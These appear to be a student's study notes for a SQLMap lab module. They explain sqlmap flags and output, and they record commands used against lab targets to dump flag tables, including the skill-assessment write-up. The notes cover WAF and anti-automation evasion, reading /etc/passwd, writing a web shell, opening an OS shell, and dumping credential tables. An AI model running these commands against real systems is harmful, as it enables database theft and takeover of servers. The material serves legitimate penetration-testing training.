* SQLMap is a free and open-source testing tool written in Python that automates process of detecting and exploiting SQL Injections
* Installation:
```shellsession
sudo apt install sqlmap # package manager
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev # or clone it 
```
* Supports all SQL Injection Types
```shellsession
sqlmap -hh
...SNIP... Techniques: --technique=TECH.. SQL injection techniques to use (default "BEUSTQ")
```
* BEUSTQ
	* B: Boolean-based blind
	* E: Error-based
	* U: Union query-based
	* S: Stacked Queries
	* T: Time-based blind
	* Q: Inline Queries

## Getting Started with SQLMap
* https://github.com/sqlmapproject/sqlmap/wiki/Usage
```shellsession
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```
--batch runs sqlmap in non-interactive mode

## SQLMAP Output Description
**Log Message Description:**
* URL content is stable -> - "target URL content is stable"
	* means that there are no major changes between responses in case of continous identical requests
	* important to know because differences are then easier to spot
* Parameter appears to be dynamic -> - "GET parameter 'id' appears to be dynamic"
	* desired for the tested parameter to be dynamic
* Parameter might be injectible -> "heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')"
	* SQLMap intentionally sends invalid values to test for errors
* Parameter might be vulnerable to XSS -> - "heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"
* Back-end DBMS is... -> - "it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? Y/n"
* Level/risk values -> - "for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? Y/n"
	* If there is a clear indication that the target uses the specific DBMS, it is also possible to extend the tests for that same specific DBMS beyond the regular tests
* Reflective values found -> - "reflective value(s) found and filtering out"
	* Just a warning that parts of the used payloads are found in the response
* Parameter appears to be injetible -> "GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")"
* Time-based comparison statistical model -> - "time-based comparison requires a larger statistical model, please wait........... (done)"
	* SQLMap uses a statistical model for the recognition of regular and (deliberately) delayed target responses
* Extending UNION query injection technique tests -> - "automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found"
	* To lower the testing time per parameter, especially if the target does not appear to be injectable, the number of requests is capped to a constant value (i.e., 10) for this type of check
	* However, if there is a good chance that the target is vulnerable SQLMap extends the default number of requests for UNION query SQLi
* Technique appears to be usable -> - "ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test"
* Parameter is vulnerable -> - "GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? y/N"
* SQLMap identified Injection points -> - "sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:"
* Data logged to text files -> - "fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com/'"

# Building Attacks
### Running SQLMap on an HTTP Request
**Curl commands**:
* Copy as cUrl in Browser Devl Tools
* just change curl command with sqlmap
* also: --dump dumps found information (tables etc.) of the db
**GET/POST Requests**
* Commonly GET Parameters are provided with the usage of option -u / --url
* for POST data, the --data flag can be used
```shellsession
lunims@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```
* We can narrow down the tests by using the symbol *
```shellsession
lunims@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```
**Full HTTP Request**
* if we need to specify a complext HTTP request we can specify the -r flag
* SQLMap is then provided a request file, containing the whole HTTP request
```shellsession
lunims@htb[/htb]$ sqlmap -r req.txt
```
**Custom SQLMap Requests**
* --cookie specifies cookie value to use
* set Headers with -H/--header
* Same for --host, --referer and -A/--user-agent
* --random-agent randomly selects a User-agent header value from included db of regular browser values
* --mobile intimates smarthpone 
* --method selects HTTP method
**Custom HTTP Requests**
* SQLMap also supports JSON and XML formatted HTTP requests

Tasks: To fuzz a cookie, at least **--level=2** has to be clarified or we can directly specify it with injection mark (\*)

## Handling SQLMap Errors
**Display Errors**
First step is to usually switch the --parse-errors flag, to parse DBMS errors and displays them as part of the program run.

With **-t** flag we can store the output to a file:
```shellsession
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

With **-v** we get verbose output (different levels):
```shelssession
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```

With **--proxy** we can specify a proxy (like ZAP or Burp)

### Attack Tuning
**Prefix/Suffix:**
If special prefixes or suffixes are needed:
```shellsession
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```
**Level/Risk:**
There is possibility to use bigger sets of boundaries and vectors:
* **--level** (1-5): extends both vectors and boundaries being used, based on their expectancy of success
* **--risk** (1-3): extends the used vector set based on their risk of causing problems at the target side
Commonly, increasing level or risk is not advised as it slows down the testing process. 
However, in special cases of SQLi vulnerabilities, where usage of `OR` payloads is a must (e.g., in case of `login` pages), we may have to raise the risk level.

**Advanced Tuning:**
* Status Codes -> **--code** can be used to fixate the detection of "True" responses to status code 200
* Titles -> if difference can be seen by inspecting HTML titles, the switch **--title** can be used 
* Strings -> **--string** can be used to fixate detection based only of appearance of a single string value
* Text-only -> when dealing with a lot of hidden content, we can use **--text-only** which removes all HTML tags and bases comparison only on textual (i.e. visible) content
* Techniques -> We can narrow down used SQL techniques with **--technique** (e.g. --technique=BEU)
* Union SQLi Tuning -> we can specify the number of columns needed for Union based SQLinjections with **--union-cols**, also **--union-char='a'** can be used to specify a value to select in case dummy values NULL or integers (default) do not work

**Task:**
```shellsession
sqlmap -u "http://154.57.164.83:30307/case5.php?id=1" --batch --dump -T flag5 --level=5 --risk=3 -
```
```shellsession
sqlmap -u "http://154.57.164.64:32376/case6.php?col=id" --batch --dump --prefix="\`)" 
```
```shellsession
sqlmap -u "http://154.57.164.64:32376/case7.php?id=1" --batch --dump --union-cols=5
```

# Database Enumeration
### SQLMap Data Exfiltration
* --banner: Database version banner
* --current-user: current user name
* --current-db: current database name
* --is-dba: checks if current user has DBA (admin)
```shellsession
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```
**Table Enumeration:**
* --tables: retrieval of table names
* -D specifies DB name
```shellsession
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```
* specific table can be dumped with --dump -T
```shellsession
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```
**Table/Row Enumeration**
* -c can specify columns
```shellsession
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```
  * specify rows with --start and --stop
```shellsession
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```
  **Conditional Enumeration:**
* specify where condition with --where
```shellsession
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```
**Full DB Enumeration:**
* --dump will dump all content of current db
* --dump-all dumps all content of all databases (best used with --exclude-sysdbs)

**Task Query**
```shellsession
sqlmap -u "http://154.57.164.64:32376/case1.php?id=1" --dump-all -T flag6 --batch --threads=6 --exclude-sysdb
```

**DB Schema Enumeration:**
* --schema flag retrieves structure of all tables
```shellsession
sqlmap -u "http://www.example.com/?id=1" --schema
```
* --search: enables us to search for identifiers by using the LIKE Operator
```shellsession
sqlmap -u "http://www.example.com/?id=1" --search -T user
```
**Password Enumeration/Cracking:**
* SQLMap has automatic password hashes cracking mechanisms
* also --pasword flag: attempts to dump the content of system tables containing database-specific credentials

Tip: The '--all' switch in combination with the '--batch' switch, will automa(g)ically do the whole enumeration process on the target itself, and provide the entire enumeration details.

**Task Queries:**
```shellsession
sqlmap -u "http://154.57.164.64:32376/case1.php?id=1" --search -C style 
```

```shellsession
sqlmap -u "http://154.57.164.64:32376/case1.php?id=1" --schema
# Here we see that users table has password entry
sqlmap -u "http://154.57.164.64:32376/case1.php?id=1" --dump -T users --batch
```

## Advanced SQLMap Usage
**CSRF Tokens:**
* --csrf-token: sqlmap attempts to parse the token and uses them in coming requests
* also user prompt if not specified 
```shellsession
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```
**Unique Value Bypass:**
* sometimes a certain value only needs to be unique 
* --randomize flag
```shellsession
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5
```
**Calculated Parameter Bypass:**
* sometimes a parameter value needs to be calculated based on other param values
* e.g. message digest
* --eval option
```shellsession
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5
```
**IP Addr Concealing:**
* In case we want to hide our IP addr
* --proxy
* --proxy-file: sqlmap will go through this list, in case one of the proxies will get blacklisted, sqlmap will just use the next
* --tor and --check-tor
**WAF:**
* sqlmap automatically checks for WAF and in presence of one uses a 3rd party library for evasion
* if we want to skip this: --skip-waf
**Tamper Scripts:**
* tamper scripts can be used to modify requests before sending them
* for example replace > operator with SQL syntax
* --tamper flag
	* full list can be shown with --list-tampers
**Miscellanous Bypasses:**
* --chunked splits POST requests into chunks
* also HTTP parameter pollution

**Task Queries:**
```shellsession
sqlmap -u 'http://154.57.164.81:30918/case8.php' --data-raw 'id=1&t0ken=34A88qjvK8qv3huSwJjocdjch2SR2rWd5IRMfzAdpY' --csrf-token="t0ken" --batch --dump -T flag8
```

```shellsession
sqlmap -u "http://154.57.164.81:30918/case9.php?id=1&uid=210386651" --data "id=1&uid=210386651" --randomize=uid --batch --dump -T flag9
```

```shellsession
sqlmap -u "http://154.57.164.81:30918/case10.php" --method POST --data "id=1" --random-agent --batch --dump -T flag10
```

```shellsession
sqlmap -u "http://154.57.164.81:30918/case11.php?id=1" --tamper=between --batch --dump -T flag11
```

### OS Exploitation
**File Read/Write:**
* checking for dba privileges: --is-dba
* --file-read: 
```shellsession
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```
* for writing files: --file-write and --file-dest
	* first prepare a web shell
	* then attempt to write this shell with both options
		* --file-write specifies the actual file to write
		* --file-dest specifies the destination on target server
```shellsession
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```
**OS Command Execution:**
* sqlmap has the ability to give us an easy OS shell without manually writing a remote shell
* --os-shell
* Keep in mind: we can change used techniques: --technique=E
```shellsession
sqlmap -u "http://www.example.com/?id=1" --os-shell
```

**Task Queries:**
```shellsession
sqlmap -u "http://154.57.164.82:30561/?id=1" --file-read="/var/www/html/flag.txt" --batch
```

```shellsession
sqlmap -u "http://154.57.164.82:30561/?id=1" --os-shell --batch
```

# Skill Assessment
After clicking around on the target, I see that most of the buttons are fake and do not have any functionality. However, I found following endpoint, which might interesting:
http://154.57.164.76:31743/action.php

After some basic usage with sqlmap, I was not able to find a SQL Injection vulnerability at first. Then i wanted to fuzz the endpoint using ZAP, when i noticed that the page does not actually load when proxying through ZAP. Hence, i came to the idea of using the --random-agent header with sqlmap, as the website seems to have some sort of anti-automation mechanism.

```shellsession
sqlmap -u "http://154.57.164.76:31743/action.php" --data '{"id":1}' -H "Content-type: application/json" --batch --random-agent
```

This actually worked. So i tried to start with some basic enumeration.

```shellsession
sqlmap -u "http://154.57.164.76:31743/action.php" --data '{"id":1}' -H "Content-type: application/json" --batch --random-agent --banner --current-user --current-db --is-dba --threads=6
```

However, i was not able to get responses for the current database and current user. To get this to work, i also needed to specify the tamper script --tamper=between.
Then sqlmap is also able to retrieve values. The DB name is production. I then enumerated all tables in production:
```shellsession
sqlmap -u "http://154.57.164.76:31743/action.php" --data '{"id":1}' -H "Content-type: application/json" --batch --tables -D production --random-agent --tamper=between
```
This shows, that there is the table final_flag table we are looking for. Hence, we enerumate its content and get the flag:
```shellsession
sqlmap -u "http://154.57.164.76:31743/action.php" --data '{"id":1}' -H "Content-type: application/json" --batch --dump -T final_flag -D production --random-agent --tamper=between
```
